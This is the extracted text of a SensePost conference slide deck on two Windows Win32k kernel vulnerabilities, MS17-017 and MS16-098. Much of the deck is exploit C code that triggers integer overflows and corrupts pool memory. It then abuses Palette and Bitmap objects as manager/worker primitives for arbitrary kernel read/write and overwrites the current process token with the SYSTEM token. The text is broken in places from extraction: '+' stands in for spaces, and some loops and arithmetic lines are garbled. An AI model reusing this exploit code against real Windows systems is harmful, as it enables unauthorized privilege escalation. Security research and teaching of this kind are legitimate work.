•
The+extended+Bitmap+object+is+used,+to+update+the+adjacent+Palette+object+
cEntires member+extending+its+size+and+gaining+relative+memory+read/write.
for+(int y+=+0;+y++0x3BB)+{
printf("[*]+Manager+XEPALOBJ+Object+Handle:+0x%x\r\n",+hp[k]);
hpManager =+hp[k];
break;
}
}
SENSEPOST
MS17-017: Win32k!EngRealizeBrush Integer 
Overflow – Abusing Palette Objects
UINT+wAddress =+rPalette[0x3FE];
printf("[*]+Worker+XEPALOBJ->pFirstColor:+0x%04x.\r\n",+wAddress);
UINT+tHeader =+pFirstColor - 0x1000;
tHeader =+tHeader &+0xFFFFF000;
printf("[*]+Gh05+Address:+0x%04x.\r\n",+tHeader);
SetPaletteEntries((HPALETTE)hpManager,+0x3FE,+1,+
(PALETTEENTRY*)&tHeader);
Original+
XEPALOBJ.*pFirstColor
Updated+
XEPALOBJ.*pFirstColor
SENSEPOST
MS17-017: Win32k!EngRealizeBrush Integer 
Overflow – Abusing Palette Objects
• Finding+the+Worker+Palette
UINT+wBuffer[2];
for+(int x+=+0;+x+>+24+==+0x35)+{
hpWorker =+hp[x];
printf("[*]+Worker+XEPALOBJ+object+Handle:+0x%x\r\n",+
hpWorker);
break;
}
}
VersionSpecificConfig gConfig =+{+0x0b4+,+0x0f8+};
void+SetAddress(UINT*+address)+{
SetPaletteEntries((HPALETTE)hpManager,+0x3FE,+1,+
(PALETTEENTRY*)address);
}
void+WriteToAddress(UINT*+data,+DWORD+len)+{
SetPaletteEntries((HPALETTE)hpWorker,+0,+len,+(PALETTEENTRY*)data);
}
UINT+ReadFromAddress(UINT+src,+UINT*+dst,+DWORD+len)+{
SetAddress((UINT+*)&src);
DWORD+res+=+GetPaletteEntries((HPALETTE)hpWorker,+0,+len,+
(LPPALETTEENTRY)dst);
return+res;
}
Extended+Palette+
used+as+Manager+to+
set+*pFirstColor of+
Worker+Palette.
Worker+Palette+used+
to+read/write+from+
location+pointed+to+
by+*pFirstColor
SENSEPOST
MS17-017: Win32k!EngRealizeBrush Integer 
Overflow – Steal x86 SYSTEM process Token
• Replacing+the+Current+process+Token+with+the+SYSTEM+
one.
//+get+System+EPROCESS
UINT+SystemEPROCESS =+PsInitialSystemProcess();
//fprintf(stdout,+"\r\n%x\r\n",+SystemEPROCESS);
UINT+CurrentEPROCESS =+PsGetCurrentProcess();
//fprintf(stdout,+"\r\n%x\r\n",+CurrentEPROCESS);
UINT+SystemToken =+0;
//+read+token+from+system+process
ReadFromAddress(SystemEPROCESS ++gConfig.TokenOffset,+&SystemToken,+1);
fprintf(stdout,+"[*]+Got+System+Token:+%x\r\n",+SystemToken);
//+write+token+to+current+process
UINT+CurProccessAddr =+CurrentEPROCESS ++gConfig.TokenOffset;
SetAddress(&CurProccessAddr);
SENSEPOST
MS17-017: Win32k!EngRealizeBrush Integer 
Overflow - SYSTEM!!!
SENSEPOST
MS16-098 RGNOBJ Win32k!bFill
Integer Overflow Leading To
Pool Overflow
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
UlongMult:+checks+if+
multiplication+will+result+
in+overflow.
Value+at+[rsp+size]+
passed+to+the+
allocation+func
PALLOCMEM2+as+the+
Size+Parameter
In+the+unpatched+
version+the+supplied+size+
value+is+multiplied+
without+checking+can+be+
overflowed+to+a+smaller+
allocation+size.
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Reaching the Vulnerable Function
// Get Device context of desktop hwnd 
HDC hdc = GetDC(NULL); 
// Get a compatible Device Context to assign Bitmap to 
HDC hMemDC = CreateCompatibleDC(hdc); 
// Create Bitmap Object 
HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL); 
// Select the Bitmap into the Compatible DC 
HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap); 
//Begin path 
BeginPath(hMemDC); 
// draw a line between the supplied points. 
LineTo(hdc, nXStart + ((int) (flRadius * aflCos[i])), nYStart + 
((int) (flRadius * aflSin[i])));          
// End the path 
EndPath(hMemDC); 
// Fill the path 
FillPath(hMemDC); 
EngFastFill() -> bPaintPath() -> bEngFastFillEnum() -> Bfill()
bFill@(struct EPATHOBJ+*@,+struct _RECTL+*@,+unsigned+__int32@,+void+
(__stdcall *)(struct _RECTL+*,+unsigned+__int32,+void+*)@,+void+*)
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Controlling the Allocation Size
0"########
3
+ 1 = 0"55555556
0"55555556( ∗ 3 = 0"100000002
0"100000002 ≪ 4 = 0"1000000020
32-bit+(4+Byte)+Value+in+ecx
lea+ecx,+[rax+rax*2];
shl ecx,+4
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Controlling the Allocation Size
• Number+of+Points+in+selected+Path.
• PolyLineTo
• Calling+it+0x156+times+with+0x3FE01+points:
0"156( ∗ 0"3#901 = 0"5555556
// Create a Point array
static POINT points[0x3FE01];
BeginPath(hMemDC);
// Calling PolylineTo 0x156 times with 
PolylineTo points of size 0x3fe01.
for (int j = 0; j +addEdgeToGet.
Current+POINT.Y+[r9+4]
=
r11+
The+function+will+try+to+copy+0x5555557+Points+(0x30+bytes+
each),+to+the+newly+allocated+0x50+bytes+memory.
Previous+POINT.Y+[r8+4]
=
r10
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Analysing & Controlling the Overflow
This+check+will+allow+us+to+control+
how+many+points+are+copied+
across+and+thus+control+the+
overflow.
(CURRENT+POINT.Y+++0x1F0
ecx =+CURRENT+POINT.Y
eax =+0x1F0
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Analysing & Controlling the Overflow
• Points[2]+=+20+(0x14)+++0x1F
for (int j = 0; j  0x1F && points[2].y != 
0x5a1f) { 
points[2].y = 0x5a1f; 
} 
if (!PolylineTo(hMemDC, points, 0x3FE01)) { 
fprintf(stderr, "[!] PolylineTo() Failed: %x\r\n", 
GetLastError()); 
}} 
!
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Analysing & Controlling the Overflow
Extended+sizlBitmap after+overflow
sizlBitmap before+
overflow
• Looking+at+the+adjacent+Bitmap+object+before+and+after+the+overflow.+
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Analysing & Controlling the Overflow
• Where+did+the+value+0xFFFFFFFF+that+overwritten+the+
Bitmap+Height+came+from?+
Subtracts+the+
previous+
point.y = r10+
from+the+
current+
point.y at+ebp
If+result+was+
positive+write+1+
to+[point++28]+
pointed+to+by+rdx
If+result+was+
signed+(neg)+write+
0xFFFFFFFF+to+
[point++28]+
pointed+to+by+rdx
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Abusing Bitmap Objects
• loop+over+GetBitmapBits,+that+returns+cbBuffer size+larger+than+the+
original+Bitmap+allocated+during+the+kernel+pool+spray.
for (int k=0; k  0x150) 
{ 
hManager = bitmaps[k]; 
hWorker = bitmaps[k+1]; 
break 
} 
} 
!
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Abusing Bitmap Objects
addr1[0x0] = 0; 
int u = addr1[0x1]; 
u = u - 0x10; 
addr1[1] = u; 
!
Overflowed+Region+Object+address+at+the+start+of+the+previous+Page+
addr1[0] = 0xc0; 
int y = addr1[1]; 
y = y + 0xb; 
addr1[1] = y; 
!
Overflowed+Bitmap+Object+(previous+page+address+++0xBC0)+
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Abusing Bitmap Objects
void SetAddress(BYTE* address) { 
for (int i = 0; i < sizeof(address); i++) { 
bits[0xdf0 + i] = address[i]; 
} 
SetBitmapBits(hManager, 0x1000, bits); 
} 
void WriteToAddress(BYTE* data) { 
SetBitmapBits(hWorker, sizeof(data), data); 
} 
SetAddress(addr1); 
WriteToAddress(Gh05); 
!
Extended+Bitmap+
used+as+Manager+to+
set+the+pvScan0+of+
the+Worker+Bitmap
Use+Worker+Bitmap+to+
read/write+from+
location+pointed+to+by+
pvScan0
Fix+Overflowed+
Bitmap+Header.
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
Stealing System Process Token
• The+Token+of+the+current+process+is+replaced+by+the+SYSTEM+process+
one,+using+the+arbitrary+memory+read/write.
// get System EPROCESS 
ULONG64 SystemEPROCESS = PsInitialSystemProcess(); 
//fprintf(stdout, "\r\n%x\r\n", SystemEPROCESS); 
ULONG64 CurrentEPROCESS = PsGetCurrentProcess(); 
//fprintf(stdout, "\r\n%x\r\n", CurrentEPROCESS); 
ULONG64 SystemToken = 0; 
// read token from system process 
ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, (BYTE 
*)&SystemToken, 0x8); 
// write token to current process 
ULONG64 CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset; 
SetAddress((BYTE *)&CurProccessAddr); 
WriteToAddress((BYTE *)&SystemToken); 
// Done and done. We're System :) 
!
SENSEPOST
MS16-098: Win32k!bFill Integer Overflow
SYSTEM!!!
SENSEPOST
Conclusions
• Abuse+two+GDI+objects+to+abuse+Pool+Corruption.
• Identify+and+Exploit+the+same+type+of+bugs.
• Tools:
• Get+a+hold+of+me+of+you+have+any+questions,+ideas,+
modifications,+or+if+you+find+where+Diego+Juarez+is+?
Saif+(at)+SensePost.com
@Saif_Sherei
SENSEPOST
Q & A
SENSEPOST